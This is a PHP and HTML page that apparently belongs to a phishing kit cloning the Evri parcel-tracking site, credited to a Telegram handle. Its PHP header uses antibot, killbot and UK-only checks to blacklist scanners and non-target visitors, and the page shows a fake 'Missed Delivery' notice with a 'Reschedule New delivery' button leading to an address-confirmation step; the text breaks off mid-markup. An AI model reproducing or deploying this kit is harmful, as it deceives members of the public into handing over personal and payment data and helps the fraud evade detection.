<?php
// @Kr3pto on telegram
require "configg.php";
require "evu_assetz/einc/session_protect.php";
require "evu_assetz/einc/functions.php";
if($internal_antibot == 1){
	require "evu_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("evu_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "evu_assetz/mobile_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("evu_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("evu_assetz/einc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
session_start();

if($_POST['postcode']){
	$_SESSION['postcode'] = $_POST['postcode'];
	$postcode = $_SESSION['postcode'];
}else{
	$fp = fopen("evu_assetz/einc/blacklist.dat", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
	header_remove();
	header("Connection: close\r\n");
	http_response_code(404);
	exit;
}
?>
<!DOCTYPE html>
<html style="overflow: auto;" lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <title>Track a parcel - Evri</title>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no" />
        <link rel="icon" type="image/x-icon" href="evu_assetz/img/favicon.ico" />
        <link rel="stylesheet" href="evu_assetz/css/other.css" />
        <link rel="stylesheet" href="evu_assetz/css/styles.css" />
        <link rel="stylesheet" href="evu_assetz/css/parcel.css" />
    </head>
    <body>
        <div id="__nuxt">
            <div id="__layout">
                <div>
                    <div data-v-50e27515="" class="nav__container">
                        <nav data-v-50e27515="" class="nav">
                            <div data-v-50e27515="" class="nav__top above-mobile">
                                <div data-v-50e27515="" class="nav__top-inner">
                                    <div data-v-50e27515="" class="nav__top-type">
                                        <a data-v-50e27515="" href="javascript:void(0);" class="nav__top-type-item nav__top-type-item--active"> Personal </a>
                                        <a data-v-50e27515="" href="javascript:void(0);" class="nav__top-type-item"> Business </a>
                                    </div>
                                    <div data-v-50e27515="" class="nav__top-account">
                                        <div data-v-50e27515="" data-action="navigation--primary#signin" class="nav__top-account-item">Log in</div>
                                        <div data-v-50e27515="" data-action="navigation--primary#signup" class="nav__top-account-item">Sign up</div>
                                    </div>
                                </div>
                            </div>
                            <div data-v-50e27515="" class="nav__main">
                                <div data-v-50e27515="" class="nav__main-inner">
                                    <div data-v-50e27515="" class="nav__main-inner-side nav__main-inner-left">
                                        <a data-v-50e27515="" href="javascript:void(0);" class="nav__logo-container">
                                            <div data-v-250fdcf4="" data-v-50e27515="" data-icon="evri_logo_new_hermes" class="e-icon nav__logo e-icon--neutral-01" style="line-height: 36px;">
                                                <svg viewBox="0 0 75 32" fill="none" xmlns="http://www.w3.org/2000/svg" height="36" width="87">
                                                    <path
                                                        d="M73.05 2.623C73.05 1.128 71.842 0 70.346 0c-1.495 0-2.701 1.128-2.701 2.623 0 1.495 1.206 2.623 2.701 2.623 1.496 0 2.702-1.154 2.702-2.623ZM18.334 5.797V.13H0v3.384h2.02V18.15H0v3.357h18.334v-5.665h-3.646v2.308H5.954v-5.744h7.948V9.18H5.954V3.515h8.735v2.282h3.645ZM37.01.131l-5.876 15.082L25.338.131h-5.482l8.524 21.482h2.36L39.24.131h-2.23Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="m57.679 12.774 7.554 8.734h-3.83l-7.213-8.472H43.882v8.472H40.76V.131h14.557c3.095 0 5.01.577 6.348 1.836 1.075 1.023 1.652 2.466 1.652 4.38 0 3.778-2.413 6.112-5.64 6.427ZM43.882 2.728v7.685H55.37c1.968 0 3.017-.393 3.725-1.128.656-.708.997-1.705.997-2.911 0-1.154-.367-2.046-1.023-2.65-.735-.681-1.836-.996-3.751-.996H43.882Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                    <path
                                                        d="M74.387 20.957c-1.154-.577-1.679-1.075-1.679-2.334h.026V7.187h-6.137v.55c1.469.997 1.678 1.6 1.678 2.702v8.184c0 1.233-.524 1.757-1.678 2.334v.551h7.79v-.55Zm-69.64 4.197v.892H2.964v5.823H1.862v-5.823H.052v-.892h4.695Zm5.299 2.361a1.839 1.839 0 0 0-.76-.787c-.316-.184-.683-.262-1.102-.289-.341 0-.656.053-.945.184-.288.131-.524.288-.708.524v-2.439H5.456v7.187h1.101v-2.99c0-.472.131-.84.368-1.102.236-.262.55-.393.97-.393.393 0 .734.131.97.393.237.263.368.63.368 1.102v2.99h1.101v-3.148c0-.472-.104-.891-.288-1.232Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M16.157 29.613h-4.091c.026.42.183.76.472 1.023.288.262.63.393 1.049.393.603 0 1.023-.236 1.259-.734h1.18a2.356 2.356 0 0 1-.865 1.207c-.42.314-.945.472-1.574.472-.499 0-.97-.105-1.364-.341a2.582 2.582 0 0 1-.944-.97c-.236-.42-.341-.893-.341-1.443 0-.551.104-1.023.34-1.443.21-.42.525-.734.945-.97.393-.236.865-.341 1.39-.341.498 0 .944.104 1.338.34.393.21.708.525.918.919.21.393.34.865.34 1.363-.012.089-.018.178-.025.263-.007.092-.013.18-.027.262Zm-1.128-.892c0-.42-.157-.734-.445-.97a1.596 1.596 0 0 0-1.05-.367c-.393 0-.708.13-.97.367-.262.236-.42.577-.472.97h2.937Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                    <path
                                                        d="M23.502 27.515a1.757 1.757 0 0 0-.787-.787c-.315-.184-.708-.262-1.128-.262a2.09 2.09 0 0 0-.892.183 2.255 2.255 0 0 0-.682.525v-.604h-1.102v5.325h1.102v-2.99c0-.472.131-.84.367-1.102.236-.262.551-.393.97-.393.394 0 .735.131.971.393.236.263.367.63.367 1.102v2.99h1.102v-3.148c0-.472-.105-.891-.288-1.232Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M29.613 29.613h-4.092c.026.42.184.76.472 1.023.289.262.63.393 1.05.393.603 0 1.023-.236 1.259-.734h1.18a2.356 2.356 0 0 1-.866 1.207c-.42.314-.944.472-1.573.472-.499 0-.97-.105-1.364-.341a2.582 2.582 0 0 1-.945-.97c-.236-.42-.34-.893-.34-1.443 0-.551.104-1.023.34-1.443.21-.42.525-.734.945-.97.393-.236.865-.341 1.39-.341.498 0 .944.104 1.338.34.393.21.708.525.918.919.21.393.34.865.34 1.363a4.09 4.09 0 0 0-.025.263c-.007.092-.013.18-.027.262Zm-1.128-.892c0-.42-.157-.734-.446-.97a1.596 1.596 0 0 0-1.049-.367c-.393 0-.708.13-.97.367-.263.236-.42.577-.473.97h2.938Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                    <path
                                                        d="m35.83 31.869 1.652-5.325H36.38l-1.1 4.276-1.076-4.276H33.05l-1.128 4.302-1.101-4.302h-1.128l1.678 5.325h1.155l1.075-3.935 1.075 3.935h1.154Zm9.468-6.715v6.741h-1.101v-2.938h-3.174v2.938H39.92v-6.74h1.102v2.884h3.174v-2.885h1.101Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M47.108 29.613h4.066a23.5 23.5 0 0 0 .078-.524c0-.499-.13-.971-.34-1.364a2.212 2.212 0 0 0-.919-.918c-.393-.236-.839-.341-1.337-.341-.525 0-.997.104-1.39.34-.42.237-.735.551-.945.971-.236.42-.34.892-.34 1.443 0 .55.104 1.023.34 1.442.236.42.551.735.945.97.393.237.865.342 1.363.342.63 0 1.154-.158 1.574-.472.42-.315.708-.709.866-1.207h-1.18c-.237.498-.656.734-1.26.734-.42 0-.76-.13-1.049-.393-.288-.262-.446-.603-.472-1.023Zm2.518-1.862c.289.236.446.55.446.97h-2.938c.053-.393.21-.734.472-.97.263-.236.578-.367.971-.367.42 0 .76.13 1.05.367Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                    <path
                                                        d="M53.64 26.675c.262-.157.576-.236.944-.236v1.154h-.289c-.42 0-.76.105-.97.341-.21.21-.342.604-.342 1.154v2.807h-1.101V26.57h1.102v.787c.183-.314.393-.524.655-.682Zm9.888.84a1.757 1.757 0 0 0-.787-.787 2.277 2.277 0 0 0-1.102-.262 2.3 2.3 0 0 0-1.101.288 1.777 1.777 0 0 0-.761.76 1.896 1.896 0 0 0-.787-.786c-.34-.184-.734-.262-1.154-.262a2.09 2.09 0 0 0-.892.183 2.255 2.255 0 0 0-.682.525v-.604h-1.101v5.325h1.101v-2.99c0-.472.131-.84.367-1.102.236-.262.551-.393.97-.393.394 0 .735.131.971.393.236.263.368.63.368 1.102v2.99h1.101v-2.99c0-.472.131-.84.367-1.102.237-.262.551-.393.971-.393.393 0 .734.131.97.393.236.263.368.63.368 1.102v2.99h1.101v-3.148c0-.472-.105-.891-.288-1.232Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                    <path
                                                        fill-rule="evenodd"
                                                        clip-rule="evenodd"
                                                        d="M69.692 29.613h-4.066c.026.42.184.76.472 1.023.289.262.63.393 1.05.393.603 0 1.022-.236 1.258-.734h1.18a2.356 2.356 0 0 1-.865 1.207c-.42.314-.944.472-1.574.472-.498 0-.97-.105-1.363-.341a2.582 2.582 0 0 1-.945-.97c-.236-.42-.34-.893-.34-1.443 0-.551.104-1.023.34-1.443.21-.42.525-.734.945-.97.393-.236.865-.341 1.39-.341.498 0 .944.104 1.337.34.394.21.709.525.919.919.21.393.34.865.34 1.363-.033.119-.045.237-.057.349-.006.061-.012.12-.021.176Zm-1.102-.892c0-.42-.157-.734-.446-.97a1.596 1.596 0 0 0-1.049-.367c-.393 0-.708.13-.97.367-.263.236-.42.577-.473.97h2.938Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                    <path
                                                        d="M70.4 31.108c.183.262.446.472.787.63.34.157.708.236 1.154.262.42 0 .76-.079 1.075-.21.315-.131.551-.315.709-.55a1.26 1.26 0 0 0 .262-.814c-.026-.34-.105-.603-.289-.813a1.9 1.9 0 0 0-.656-.472 6.558 6.558 0 0 0-.944-.315 7.058 7.058 0 0 1-.538-.17 1.101 1.101 0 0 1-.485-.276.518.518 0 0 1-.157-.367c0-.184.079-.34.236-.446.131-.105.367-.157.656-.157.288 0 .524.078.708.21.183.157.262.34.288.577h1.102a1.706 1.706 0 0 0-.603-1.26c-.367-.314-.866-.471-1.469-.471-.394 0-.76.078-1.075.21-.315.13-.578.314-.735.55a1.238 1.238 0 0 0-.262.787c0 .341.105.63.288.84.184.21.394.367.656.472.236.105.577.21.97.314.42.105.735.21.919.315.183.105.288.236.288.446 0 .21-.078.341-.262.472-.184.131-.42.184-.735.184-.288 0-.524-.079-.734-.236a.852.852 0 0 1-.315-.577h-1.154c.026.314.131.603.315.865Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </a>
                                        <div data-v-50e27515="" class="nav__main-inner-container above-mobile">
                                            <div data-v-50e27515="" class="nav__main-inner-item"><span data-v-50e27515="">Send</span></div>
                                        </div>
                                        <div data-v-50e27515="" class="nav__main-inner-container above-mobile">
                                            <div data-v-50e27515="" class="nav__main-inner-item"><span data-v-50e27515="">Track</span></div>
                                        </div>
                                        <div data-v-50e27515="" class="nav__main-inner-container above-mobile">
                                            <div data-v-50e27515="" class="nav__main-inner-item"><span data-v-50e27515="">Return</span></div>
                                        </div>
                                    </div>
                                    <div data-v-50e27515="" class="nav__main-inner-side nav__main-inner-side--right">
                                        <div data-v-50e27515="" class="nav__main-inner-container desktop-only">
                                            <div data-v-50e27515="" class="nav__main-inner-item"><a data-v-50e27515="" href="javascript:void(0);" class="nav__main-inner-item-link">Our Services</a></div>
                                        </div>
                                        <div data-v-50e27515="" class="nav__main-inner-container desktop-only">
                                            <div data-v-50e27515="" class="nav__main-inner-item"><a data-v-50e27515="" href="javascript:void(0);" class="nav__main-inner-item-link">ParcelShops</a></div>
                                        </div>
                                        <div data-v-50e27515="" class="nav__main-inner-container desktop-only">
                                            <div data-v-50e27515="" class="nav__main-inner-item"><a data-v-50e27515="" href="javascript:void(0);" class="nav__main-inner-item-link">Help</a></div>
                                        </div>
                                        <div data-v-50e27515="" class="nav__main-inner-container nav__main-inner-container-basket">
                                            <a data-v-50e27515="" href="javascript:void(0);" class="nav__basket">
                                                <div data-v-250fdcf4="" data-v-50e27515="" data-icon="basket" class="e-icon nav__basket-icon e-icon--neutral-01" style="line-height: 24px;">
                                                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                        <path
                                                            fill-rule="evenodd"
                                                            clip-rule="evenodd"
                                                            d="M10.894 3.447a1 1 0 1 0-1.788-.894L5.382 10h-2.46a1.5 1.5 0 0 0-1.456 1.864l2.155 8.621A2 2 0 0 0 5.561 22h12.877a2 2 0 0 0 1.94-1.515l2.156-8.621A1.5 1.5 0 0 0 21.079 10h-2.461l-3.724-7.447a1 1 0 1 0-1.788.894L16.382 10H7.618l3.276-6.553ZM6 18a1 1 0 1 0 2 0v-4a1 1 0 1 0-2 0v4Zm6 1a1 1 0 0 1-1-1v-4a1 1 0 1 1 2 0v4a1 1 0 0 1-1 1Zm4-1a1 1 0 1 0 2 0v-4a1 1 0 1 0-2 0v4Z"
                                                            fill="#007BC4"
                                                        ></path>
                                                    </svg>
                                                </div>
                                            </a>
                                        </div>
                                        <div data-v-50e27515="" class="nav__main-inner-container mobile-only">
                                            <div data-v-250fdcf4="" data-v-50e27515="" data-icon="user" class="e-icon nav__menu-icon e-icon--neutral-01" style="line-height: 24px;">
                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                    <path
                                                        d="M15.863 7.762a4.157 4.157 0 0 0-2.27-5.444c-2.14-.88-4.594.13-5.481 2.255a4.157 4.157 0 0 0 2.27 5.444c2.14.88 4.594-.129 5.48-2.255Zm6.12 13.458a37.533 37.533 0 0 0-.595-4.416 6.186 6.186 0 0 0-2.18-3.443 6.259 6.259 0 0 0-3.86-1.357H8.635c-3.054 0-5.227 2.025-6.04 4.8A37.527 37.527 0 0 0 2 21.22c0 .204.08.401.225.548.144.146.34.23.547.235h18.456a.792.792 0 0 0 .547-.235.78.78 0 0 0 .225-.548h-.017Z"
                                                        fill="#007BC4"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </div>
                                        <div data-v-50e27515="" class="nav__main-inner-container under-desktop">
                                            <div data-v-250fdcf4="" data-v-50e27515="" data-icon="menu" class="e-icon nav__menu-icon e-icon--neutral-01" style="line-height: 24px;">
                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                    <path d="M2 5a1 1 0 0 1 1-1h18a1 1 0 1 1 0 2H3a1 1 0 0 1-1-1Zm0 7a1 1 0 0 1 1-1h18a1 1 0 1 1 0 2H3a1 1 0 0 1-1-1Zm1 6a1 1 0 1 0 0 2h18a1 1 0 1 0 0-2H3Z" fill="#007BC4"></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </nav>
                        <div data-v-50e27515="" class="nav-offset"></div>
                    </div>
                    <div id="single-spa-application:track-app">
                        <div id="__track-app">
                            <div id="__layout">
                                <div class="track-layout">
                                    <div data-v-80c6cc08="">
                                        <div data-v-80c6cc08="" class="details__header page-color">
                                            <div data-v-80c6cc08="" class="app-container">
                                                <div data-v-bf9b0db0="" data-v-80c6cc08="" class="track-another-parcel">
                                                    <button
                                                        data-v-b3c96404=""
                                                        data-v-bf9b0db0=""
                                                        aria-label="Track another parcel"
                                                        class="e-button-tertiary e-button-tertiary--variant-2 e-button-tertiary--icon-right track-another-parcel__button"
                                                    >
                                                        <div data-v-b3c96404="" class="e-button-tertiary__icon">
                                                            <div data-v-250fdcf4="" data-v-b3c96404="" data-icon="plus_circle" class="e-icon e-icon--neutral-01" style="line-height: 16px;">
                                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="16" width="16">
                                                                    <path
                                                                        fill-rule="evenodd"
                                                                        clip-rule="evenodd"
                                                                        d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm0-19a1 1 0 0 1 1 1v5h5a1 1 0 1 1 0 2h-5v5a1 1 0 1 1-2 0v-5H6a1 1 0 1 1 0-2h5V6a1 1 0 0 1 1-1Z"
                                                                        fill="#007BC4"
                                                                    ></path>
                                                                </svg>
                                                            </div>
                                                        </div>
                                                        <span data-v-b3c96404="" class="e-button-tertiary__slot-wrapper"> Track another parcel </span>
                                                    </button>
                                                </div>
                                                <div data-v-80c6cc08="" class="details__parcel-info">
                                                    <div data-v-80c6cc08="" class="details__parcel-info-wrapper">
                                                        <h1 data-v-80c6cc08="" class="details__parcel-info-title">Your parcel from Evri</h1>
                                                        <div data-v-80c6cc08="" class="details__parcel-info-barcode-wrapper">
                                                            <div data-v-250fdcf4="" data-v-80c6cc08="" data-icon="parcel" class="e-icon details__parcel-info-barcode-icon e-icon--neutral-02" style="line-height: 16px;">
                                                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="16" width="16">
                                                                    <path
                                                                        d="M6.828 1H11v5H1.483a.2.2 0 0 1-.142-.341l4.073-4.073A2 2 0 0 1 6.828 1ZM1 8.2c0-.11.09-.2.2-.2h21.6c.11 0 .2.09.2.2V21a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8.2ZM13 1h4.172a2 2 0 0 1 1.414.586l4.073 4.073a.2.2 0 0 1-.142.341H13V1Z"
                                                                        fill="#007BC4"
                                                                    ></path>
                                                                </svg>
                                                            </div>
                                                            <p data-v-80c6cc08="" class="details__parcel-info-barcode">C00HHA0182583529</p>
                                                        </div>
                                                    </div>
                                                    <img data-v-80c6cc08="" alt="Client logo" src="evu_assetz/img/default_client_logo.png" class="details__parcel-info-client-icon" />
                                                </div>
                                            </div>
                                            <div data-v-83033bd4="" data-v-80c6cc08="" class="delivery-status-ticket app-container">
                                                <div data-v-83033bd4="" class="delivery-status-ticket__left">
                                                    <div data-v-83033bd4="" class="delivery-status-ticket__section">
                                                        <div data-v-83033bd4="" class="delivery-status-ticket__status"><h3 data-v-83033bd4="" class="delivery-status-ticket__status-title">Missed Delivery</h3></div>
                                                        <div data-v-83033bd4="" class="delivery-status-ticket__description">We missed you on last delivery</div>
                                                    </div>
                                                    <div data-v-99ae94d4="" data-v-83033bd4="" class="timeline">
                                                        <div data-v-99ae94d4="" class="timeline__bar"><div data-v-99ae94d4="" class="timeline__progress" style="background-color: #e63632; width: 100%;"></div></div>
                                                        <div
                                                            data-v-250fdcf4=""
                                                            data-v-99ae94d4=""
                                                            data-icon="my_address"
                                                            class="e-icon timeline__image e-icon--undefined timeline__image--last-step timeline__image--not-transparent"
                                                            style="line-height: 40px;"
                                                        >
                                                            <img src="evu_assetz/img/xx.png" style="width: 40px; height: 40px;" />
                                                        </div>
                                                        <div data-v-99ae94d4="" class="timeline__arrow timeline__arrow--hidden"></div>
                                                    </div>
                                                    <div data-v-83033bd4="" class="delivery-status-ticket__time">
                                                        <div data-v-83033bd4="" class="delivery-status-ticket__time-section">
                                                            <h5 data-v-83033bd4="" class="delivery-status-ticket__time-title">Delivered on</h5>
                                                            <p data-v-83033bd4="" class="delivery-status-ticket__time-text"><?=date("D jS M");?></p>
                                                        </div>
														<!--
                                                        <div data-v-83033bd4="" class="delivery-status-ticket__time-section">
                                                            <h5 data-v-83033bd4="" class="delivery-status-ticket__time-title">Delivered at</h5>
                                                            <p data-v-83033bd4="" class="delivery-status-ticket__time-text">10:31</p>
                                                        </div>
														-->
                                                    </div>
                                                </div>
                                                <div data-v-83033bd4="" class="delivery-status-ticket__right delivery-status-rhs delivery-status-rhs--hide-section-top-border">
                                                    <div data-v-a7bb8874="">
                                                        <div data-v-a7bb8874="" class="delivery-status-rhs__button-container">
                                                            <form method="post" action="AddressConfirm?sslchannel=true&sessionid=<?=generateRandomString(130);?>">
																<input type="hidden" name="item" id="item" value="yes">
																<button data-v-3b48ca05="" data-v-a7bb8874="" type="submit" class="e-button e-button--type-primary e-button--variant-1 e-button--icon-right">
																	<span data-v-3b48ca05="" class="e-button__slot-wrapper"> Reschedule New delivery </span>
																</button>
                                                            </form>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div data-v-80c6cc08="" class="details__body app-container">
                                            <div data-v-80c6cc08="" class="follow-my-parcel">
                                                <h4 class="follow-my-parcel__title">Follow my parcel</h4>
                                                <p class="follow-my-parcel__subtitle">Find out where your parcel has been on its journey to you</p>
                                                <div data-v-3b2e9f2c="" class="e-card e-card--elevation-0">
                                                    <div data-v-3b2e9f2c="" class="e-card__body">
                                                        <div data-v-3b2e9f2c="" class="follow-my-parcel__card-top"><span data-v-3b2e9f2c="" class="follow-my-parcel__card-top-bold">Barcode number: </span>C00HHA0182583529</div>
                                                        <div data-v-3b2e9f2c="" class="follow-my-parcel__list-container">
                                                            <div class="follow-my-parcel-list" data-v-3b2e9f2c="">
                                                                <div class="follow-my-parcel-list__row follow-my-parcel-list__row--hide">
                                                                    <div class="follow-my-parcel-list__icon">
                                                                        <div data-v-250fdcf4="" data-icon="tick_circle" class="e-icon follow-my-parcel-list__tick e-icon--brand-03" style="line-height: 25px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="25" width="25">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm4.805-15.549a1 1 0 1 0-1.634-1.153l-5.193 7.358-2.474-2.197a1 1 0 0 0-1.328 1.496l2.893 2.567a1.5 1.5 0 0 0 2.221-.256l5.515-7.815Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__icon follow-my-parcel-list__icon--hide">
                                                                        <div data-v-250fdcf4="" data-icon="warning_circle" class="e-icon e-icon--ui-warning" style="line-height: 25px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="25" width="25">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm2-12a2 2 0 1 1-4 0V6a2 2 0 1 1 4 0v6Zm-4 6a2 2 0 1 1 4 0 2 2 0 0 1-4 0Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__row-body">
                                                                        <div class="follow-my-parcel-list__row-title follow-my-parcel-list__row-title--solid"><div class="follow-my-parcel-list__row-title-inner">We're expecting it</div></div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__accordion-icon">
                                                                        <div data-v-250fdcf4="" data-icon="chevron_up" class="e-icon e-icon--undefined" style="line-height: 24px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M13.01 6.392a1.5 1.5 0 0 0-2.02 0l-8.664 7.9a1 1 0 0 0 1.348 1.479L12 8.177l8.326 7.594a1 1 0 1 0 1.348-1.478L13.01 6.392Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="follow-my-parcel-list__row follow-my-parcel-list__row--hide">
                                                                    <div class="follow-my-parcel-list__icon">
                                                                        <div data-v-250fdcf4="" data-icon="tick_circle" class="e-icon follow-my-parcel-list__tick e-icon--brand-03" style="line-height: 25px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="25" width="25">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm4.805-15.549a1 1 0 1 0-1.634-1.153l-5.193 7.358-2.474-2.197a1 1 0 0 0-1.328 1.496l2.893 2.567a1.5 1.5 0 0 0 2.221-.256l5.515-7.815Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__icon follow-my-parcel-list__icon--hide">
                                                                        <div data-v-250fdcf4="" data-icon="warning_circle" class="e-icon e-icon--ui-warning" style="line-height: 25px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="25" width="25">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm2-12a2 2 0 1 1-4 0V6a2 2 0 1 1 4 0v6Zm-4 6a2 2 0 1 1 4 0 2 2 0 0 1-4 0Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__row-body">
                                                                        <div class="follow-my-parcel-list__row-title follow-my-parcel-list__row-title--solid"><div class="follow-my-parcel-list__row-title-inner">We've got it</div></div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__accordion-icon">
                                                                        <div data-v-250fdcf4="" data-icon="chevron_up" class="e-icon e-icon--undefined" style="line-height: 24px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M13.01 6.392a1.5 1.5 0 0 0-2.02 0l-8.664 7.9a1 1 0 0 0 1.348 1.479L12 8.177l8.326 7.594a1 1 0 1 0 1.348-1.478L13.01 6.392Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="follow-my-parcel-list__row follow-my-parcel-list__row--hide">
                                                                    <div class="follow-my-parcel-list__icon">
                                                                        <div data-v-250fdcf4="" data-icon="tick_circle" class="e-icon follow-my-parcel-list__tick e-icon--brand-03" style="line-height: 25px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="25" width="25">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm4.805-15.549a1 1 0 1 0-1.634-1.153l-5.193 7.358-2.474-2.197a1 1 0 0 0-1.328 1.496l2.893 2.567a1.5 1.5 0 0 0 2.221-.256l5.515-7.815Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__icon follow-my-parcel-list__icon--hide">
                                                                        <div data-v-250fdcf4="" data-icon="warning_circle" class="e-icon e-icon--ui-warning" style="line-height: 25px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="25" width="25">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12Zm2-12a2 2 0 1 1-4 0V6a2 2 0 1 1 4 0v6Zm-4 6a2 2 0 1 1 4 0 2 2 0 0 1-4 0Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__row-body">
                                                                        <div class="follow-my-parcel-list__row-title follow-my-parcel-list__row-title--solid"><div class="follow-my-parcel-list__row-title-inner">On its way</div></div>
                                                                    </div>
                                                                    <div class="follow-my-parcel-list__accordion-icon">
                                                                        <div data-v-250fdcf4="" data-icon="chevron_up" class="e-icon e-icon--undefined" style="line-height: 24px;">
                                                                            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" height="24" width="24">
                                                                                <path
                                                                                    fill-rule="evenodd"
                                                                                    clip-rule="evenodd"
                                                                                    d="M13.01 6.392a1.5 1.5 0 0 0-2.02 0l-8.664 7.9a1 1 0 0 0 1.348 1.479L12 8.177l8.326 7.594a1 1 0 1 0 1.348-1.478L13.01 6.392Z"
                                                                                    fill="#007BC4"
                                                                                ></path>
                                                                            </svg>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="follow-my-parcel-list__row follow-my-parcel-list__row--hide">
                                                                    <div class="follow-my-parcel-list__icon">
